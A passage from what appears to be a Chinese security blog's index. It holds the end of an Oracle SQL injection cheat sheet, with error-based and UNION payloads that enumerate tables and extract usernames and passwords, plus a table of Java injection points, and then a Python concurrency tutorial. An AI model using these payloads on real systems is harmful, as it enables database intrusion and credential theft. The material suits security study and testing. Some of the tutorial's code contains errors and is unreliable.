<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbms_xdb_versionuncheckout(<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p><code>utl_inaddr.get_host_name()函数</code> 8g,9g,10g,版本中不需要任何权限，11g及以后的版本需要网络访问权限</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> utl.inaddr.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_version.makeversioned()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>dbms_utility.sqlid_to_sqlhash()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_utility.sqlid_to_sqlhash(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="keyword">from</span> dual <span class="keyword">in</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ordsys.ord_dicom.getmappingxpath()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="keyword">user</span>,<span class="keyword">user</span>)<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<p>ctxsys.drithsx.sn()</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual))<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h2 id="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"><a href="#6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用" class="headerlink" title="6、假如Oracle数据库中没有dual表也无法进行恢复的情况下用"></a>6、假如<code>Oracle数据库</code>中没有dual表也无法进行恢复的情况下用</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>all_tab_columns</span><br><span class="line"><span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;USERS_TPHDTZ&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+USERNAME_UTZPGF,+PASSWORD_AGKTIJ+FROM+USERS_TPHDTZ--</span></span><br></pre></td></tr></table></figure>






<p><code>&#39;</code>报错，<code>&#39;&#39;</code>显示正常</p>
<p>返回错误时，确认是Oracle数据库且</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM not-a-real-table)||&#x27;</span></span><br></pre></td></tr></table></figure>


<p>此数据库需要显式指定表明</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;||(SELECT &#x27;&#x27; FROM dual)||&#x27;</span></span><br></pre></td></tr></table></figure>




<h2 id="7、其他payload总结"><a href="#7、其他payload总结" class="headerlink" title="7、其他payload总结"></a>7、其他payload总结</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,null..... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<p><strong>判断第n个字段的类型，依次类推即可</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,null...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,<span class="string">&#x27;null&#x27;</span>...... <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users <span class="keyword">ORDER</span> <span class="keyword">BY</span> username</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> owner, table_name <span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’</span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> ‘blah’ <span class="keyword">and</span> owner <span class="operator">=</span> ‘foo’</span><br></pre></td></tr></table></figure>

<h1 id="JAVA中的注入"><a href="#JAVA中的注入" class="headerlink" title="JAVA中的注入"></a>JAVA中的注入</h1><p>伪代码方便白盒挖掘，当然黑盒也可以拿来判断一下。</p>
<table>
<thead>
<tr>
<th>种类</th>
<th>解释</th>
<th>伪代码</th>
</tr>
</thead>
<tbody><tr>
<td>String Source</td>
<td>输入点是字符串类型</td>
<td><code>one(@RequestParam(value = &quot;username&quot;) String username)</code></td>
</tr>
<tr>
<td>List<Long></td>
<td>输入点是Long泛型(用来测试误报)</td>
<td><code>longin(@RequestBody List&lt;Long&gt; user_list)</code></td>
</tr>
<tr>
<td>Optional<String></td>
<td>新特性</td>
<td><code>optionalLike(@RequestParam(value = &quot;username&quot;) Optional&lt;String&gt; optinal_username)</code></td>
</tr>
<tr>
<td>List<String> Source</td>
<td>输入点是String泛型</td>
<td><code>in(@RequestBody List&lt;String&gt; user_list)</code></td>
</tr>
<tr>
<td>Object Source</td>
<td>对象类型</td>
<td><code>objectParam(@RequestBody Student user)</code></td>
</tr>
<tr>
<td>MyBatis注入</td>
<td>XML分离SQL检测</td>
<td><code>myBatis(@RequestParam(value = &quot;name&quot;) String name)</code></td>
</tr>
<tr>
<td>In类型注入</td>
<td>In类型注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Like类型</td>
<td>Like类型注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Lombok</td>
<td>Lombok对注入漏洞的影响</td>
<td>参照代码</td>
</tr>
<tr>
<td>MyBatis注解方式注入</td>
<td>MyBatis注解方式注入</td>
<td>参照代码</td>
</tr>
<tr>
<td>Spring Data JPA</td>
<td>JPA 方式</td>
<td>参照代码</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>多进程、进程池、异步大总结</title>
    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>经常写脚本与工具，越发感觉到速度的重要性！本文从基础开始，基于Python讲解，适合小白阅读，但需要一定代码功底。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownrxesbPFqSN2uTp3.jpg"></p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>在正式进入学习之前，先要了解一定的基础知识。</p>
<h2 id="1-1-阻塞"><a href="#1-1-阻塞" class="headerlink" title="1.1 阻塞"></a>1.1 阻塞</h2><ul>
<li>程序未得到所需计算资源时被挂起的状态。</li>
<li><strong>程序在等待某个操作完成期间，自身无法继续干别的事情，则称该程序在该操作上是阻塞的****。</strong></li>
<li>常见的阻塞形式有：<code>网络I/O阻塞</code>、<code>磁盘I/O阻塞</code>、<code>用户输入阻塞</code><strong>等</strong>。</li>
</ul>
<p>阻塞是无处不在的，包括CPU切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。（如果是多核CPU则正在执行上下文切换操作的核不可被利用）</p>
<h2 id="1-2-非阻塞"><a href="#1-2-非阻塞" class="headerlink" title="1.2 非阻塞"></a>1.2 非阻塞</h2><ul>
<li><strong>程序在等待某操作过程中，自身不被阻塞，可以继续运行干别的事情，则称该程序在该操作上是非阻塞的。</strong></li>
<li>非阻塞并<code>不是</code>在任何程序级别、任何情况下都可以存在的。</li>
<li>仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li>
</ul>
<p>非阻塞的存在是因为阻塞存在，正因为某个操作阻塞导致的耗时与效率低下，我们才要把它变成非阻塞的。</p>
<h2 id="1-3-同步"><a href="#1-3-同步" class="headerlink" title="1.3 同步"></a>1.3 同步</h2><ul>
<li>不同程序单元为了完成某个任务，在执行过程中需靠某种通信方式以<strong>协调一致</strong>，称这些程序单元是同步执行的。</li>
<li>例如购物系统中更新商品库存，需要用“行锁”作为通信信号，让不同的更新请求强制排队顺序执行，那更新库存的操作是同步的。</li>
<li>简言之，<strong>同步意味着有序</strong>。</li>
</ul>
<h2 id="1-4-异步"><a href="#1-4-异步" class="headerlink" title="1.4 异步"></a>1.4 异步</h2><ul>
<li>为完成某个任务，不同程序单元之间<strong>过程中无需通信协调</strong>，也能完成任务的方式。</li>
<li>不相关的程序单元之间可以是异步的。</li>
<li>例如，爬虫下载网页。调度程序调用下载程序后，即可调度其他任务，而无需与该下载任务保持通信以协调行为。不同网页的下载、保存等操作都是无关的，也无需相互通知协调。这些异步操作的完成时刻并不确定。</li>
<li>简言之，<strong>异步意味着无序</strong>。</li>
</ul>
<p>上文提到的<code>“通信方式”</code>通常是指异步和并发编程提供的<code>同步原语</code>，如<code>信号量</code>、<code>锁</code>、<code>同步队列</code>等等。我们需知道，虽然这些通信方式是为了让多个程序在一定条件下同步执行，但正因为是异步的存在，才需要这些通信方式。如果所有程序都是按序执行，其本身就是同步的，又何需这些同步信号呢？</p>
<h2 id="1-5-并发"><a href="#1-5-并发" class="headerlink" title="1.5 并发"></a>1.5 并发</h2><ul>
<li>并发描述的是程序的组织结构。指程序要被设计成多个可独立执行的子任务。</li>
<li><strong>以利用有限的计算机资源使多个任务可以被实时或近实时执行为目的。</strong></li>
</ul>
<h2 id="1-6-并行"><a href="#1-6-并行" class="headerlink" title="1.6 并行"></a>1.6 并行</h2><ul>
<li>并行描述的是程序的执行状态。指多个任务同时被执行。</li>
<li><strong>以利用富余计算资源（多核CPU）加速完成多个任务为目的。</strong></li>
</ul>
<p>并发提供了一种程序组织结构方式，让问题的解决方案可以并行执行，但并行执行不是必须的。</p>
<h2 id="1-7-概念总结"><a href="#1-7-概念总结" class="headerlink" title="1.7 概念总结"></a>1.7 概念总结</h2><ul>
<li><code>**并行**</code>是为了利用多核加速多任务完成的进度</li>
<li><code>**并发**</code>是为了让独立的子任务都有机会被尽快执行，但不一定能加速整体进度</li>
<li><code>**非阻塞**</code>是为了提高程序整体执行效率</li>
<li><code>**异步**</code>是高效地组织非阻塞任务的方式</li>
</ul>
<h2 id="1-8-全局解释器锁"><a href="#1-8-全局解释器锁" class="headerlink" title="1.8 全局解释器锁"></a>1.8 全局解释器锁</h2><ul>
<li>CPython 在解释器进程级别有一把锁，叫做GIL，即全局解释器锁。</li>
<li>GIL 保证CPython进程中，只有一个线程执行字节码。甚至是在多核CPU的情况下，也只允许同时只能有一个CPU 上运行该进程的一个线程。</li>
<li>CPython中<ol>
<li><strong>IO密集型</strong>，某个线程阻塞，就会调度其他就绪线程；</li>
<li><strong>CPU密集型</strong>，当前线程可能会连续的获得GIL，导致其它线程几乎无法使用CPU。</li>
</ol>
</li>
<li>在CPython中由于有GIL存在，IO密集型，使用多线程较为合算；CPU密集型，使用多进程，要绕开GIL。</li>
</ul>
<p>要支持并发，必须拆分为多任务，不同任务相对而言才有阻塞&#x2F;非阻塞、同步&#x2F;异步。所以，并发、异步、非阻塞三个词总是如影随形。</p>
<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a><center>多线程</center></h1><p>了解以上内容，就可以来看多线程了，标题明明没有多线程我为什么还要讲多线程呢？</p>
<p>Python因为<code>GIL（全局解释器锁）</code>的存在，Python的多线程并不是真正的多线程，但是在同步不阻塞的情况下，却可以发挥出多线程的效果，无法做到异步，但是可以推荐了解一下，了解之后可以更方便学习多进程。</p>
<h2 id="线程的基本概念"><a href="#线程的基本概念" class="headerlink" title="线程的基本概念"></a>线程的基本概念</h2><p><code>线程</code>是指进程内的一个执行单元,也是进程内的可调度实体。</p>
<p><font color="red"><strong>一个进程可以拥有多个线程。</strong></font></p>
<p>与进程的区别:  </p>
<ul>
<li><p>地址空间:进程内的一个执行单元;进程至少有一个线程;它们共享进程的地址空间;而进程有自己独立的地址空间； </p>
</li>
<li><p>资源拥有:进程是资源分配和拥有的单位,同一个进程内的线程共享进程的资源；</p>
</li>
<li><p>线程是处理器调度的基本单位,但进程不是；</p>
</li>
<li><p>二者均可并发执行。</p>
</li>
</ul>
<p>简而言之,<font color="red"><strong>一个程序至少有一个进程,一个进程至少有一个线程</strong></font>。</p>
<p>线程的划分尺度小于进程，使得多线程程序的并发性高。<br>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</p>
<h2 id="threading、queue"><a href="#threading、queue" class="headerlink" title="threading、queue"></a>threading、queue</h2><p>Python实现多线程主要用threading模块，线程同步则是用queue模块实现。</p>
<p>线程同步有4种实现方式：</p>
<ul>
<li>锁机制</li>
<li>信号量</li>
<li>条件判断</li>
<li>同步队列</li>
</ul>
<p>queue模块内部封装了锁原语，使用先进先出队列的时候使用互斥锁。</p>
<p>下面用这个例子讲解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开文件</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            q.put(line)</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resp</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = q.get()</span><br><span class="line">        s += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dir.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">                f.writelines(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    threadings = []</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    threadings.append(t1)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t2 = threading.Thread(target=resp, args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">        threadings.append(t2)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure>

<p>代码第26行实例化了一个先进先出的queue队列，27行创建一个线程池。</p>
<p><code>t1</code>是第一个线程，target指向方法，atgs指向传值，q后面必须加逗号。</p>
<p>31-33行，把t1添加到线程池，等他循环完，就阻塞。</p>
<h1 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a><center>多进程</center></h1><p>Python中的多线程无法利用多核优势，如果想要<code>充分地使用多核CPU的资源</code>，在python中大部分情况需要使用多进程。</p>
<h2 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h2><p>Python实现多进程主要依靠<code>multiprocessing模块</code>实现.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br></pre></td></tr></table></figure>

<p><code>multiprocessing</code>模块用来开启子进程，并在子进程中执行我们定制的任务（比如函数）</p>
<p><code>multiprocessing</code>模块的功能众多：支持子进程、<strong>通信和共享数据</strong>、执行不同形式的同步，提供了<code>Process、Queue、Pipe、Lock</code>等组件。</p>
<p><font color="red"><strong>与线程不同，进程没有任何共享状态，进程修改的数据，改动仅限于该进程内</strong></font></p>
<p>写法与线程类死，但是<font color="red"><strong>进程类必须在main()内</strong></font>,使用队列也必须是multiprocessing内的队列。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;线程启动了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=text1, args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p1.join()</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong>有两种启动方式，多线程必须用.start()，如果用.run()就降级为单进程了。</strong></font></p>
<h1 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a><center>进程池</center></h1><p>主要用multiprocessing中的Pool实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pool, Pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Pipe</span><br><span class="line">    <span class="comment"># 100个任务</span></span><br><span class="line">    data = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">100</span>))</span><br><span class="line">    <span class="comment"># 进程池大小</span></span><br><span class="line">    pool = Pool(processes=<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># 一个一个提交</span></span><br><span class="line">    <span class="comment"># pool_out_puts = pool.apply(index_pool,(q,))</span></span><br><span class="line">    <span class="comment"># 一次性大量提交</span></span><br><span class="line">    pool_out_puts = pool.<span class="built_in">map</span>(index_pool, (q,))</span><br><span class="line">    pool.close()<span class="comment"># 关闭进程</span></span><br><span class="line">    pool.join()<span class="comment"># 阻塞进程</span></span><br></pre></td></tr></table></figure>

<p><strong>线程池是不能用队列来进行通信的，要用管道，也就是Pipe</strong></p>
<p>apply_async() 异步提交任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))</span><br><span class="line">        <span class="built_in">print</span>(res.get())</span><br></pre></td></tr></table></figure>

<p>只能通过.get()得到返回值</p>
<p>通过异步的方式取返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    res_lst = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))     <span class="comment"># 先把任务全提交</span></span><br><span class="line">        res_lst.append(res)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> res_lst:</span><br><span class="line">        <span class="built_in">print</span>(res.get())  <span class="comment"># get本身就有阻塞的效果了，就不需要join再阻塞一次了,谁先拿到结果先取谁就行了</span></span><br></pre></td></tr></table></figure>

<p>用map()提交任务时取返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool,Queue,Pipe</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    ret = <span class="built_in">map</span>(func, <span class="built_in">range</span>(<span class="number">20</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;--&gt;&#x27;</span>, i)    </span><br></pre></td></tr></table></figure>

<h1 id="异步"><a href="#异步" class="headerlink" title="异步"></a><center>异步</center></h1><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>让一个线程在代码中来回切换游走。</p>
<p>协程（Corourine），也可以称为微线程，是一种用户态内的上下文切换技术。简而言之，其实就是通过一个线程实现代码块相互切换执行。</p>
<p>实现协程的方法的主流方法</p>
<p>async、await关键字（&gt;Python3.5）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>协程的意义</p>
<p>  在一个线程中遇到如果遇到IO等待时间，线程不会等待，利用空闲的时间再去做其他的事情。</p>
</li>
</ul>
<h2 id="asyncio事件循环"><a href="#asyncio事件循环" class="headerlink" title="asyncio事件循环"></a>asyncio事件循环</h2><p> 也就是一个死循环，去检测并执行某些代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 伪代码</span></span><br><span class="line"></span><br><span class="line">任务列表 = [任务<span class="number">1</span>， 任务<span class="number">2</span>， 任务<span class="number">3</span>，。。。。]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有任务，将<span class="string">&#x27;可执行&#x27;</span>和<span class="string">&#x27;已执行&#x27;</span>的任务返回</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 就绪任务 <span class="keyword">in</span> 可执行任务列表:</span><br><span class="line">        执行已就绪的任务</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 已完成的任务 <span class="keyword">in</span> 已完成的任务列表:</span><br><span class="line">        在任务列表中移除 已完成的任务</span><br><span class="line">        </span><br><span class="line">    如果 任务列表 中的任务都已完成，则终止循环</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>



<ul>
<li><p>协程函数</p>
<ul>
<li>定义函数的时候<code>async def 函数名</code></li>
</ul>
</li>
<li><p>协程对象</p>
<ul>
<li>执行协程函数()得到的就是协程对象</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">result = func()</span><br></pre></td></tr></table></figure>

<p><strong>执行协程函数创建协程对象，函数内部不会执行代码</strong></p>
<p>如果想要运行协程函数内部代码，必须要把协程对象交给事件循环来处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">q = func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python &gt; 3.7</span></span><br><span class="line">asyncio.run(q)</span><br></pre></td></tr></table></figure>



<h2 id="await关键字"><a href="#await关键字" class="headerlink" title="await关键字"></a>await关键字</h2><p>await+可等待对象（协程对象、Future、Task对象）</p>
<p>  await就是等待对象的值得到结果之后在继续向下走</p>
<p>示例1：</p>
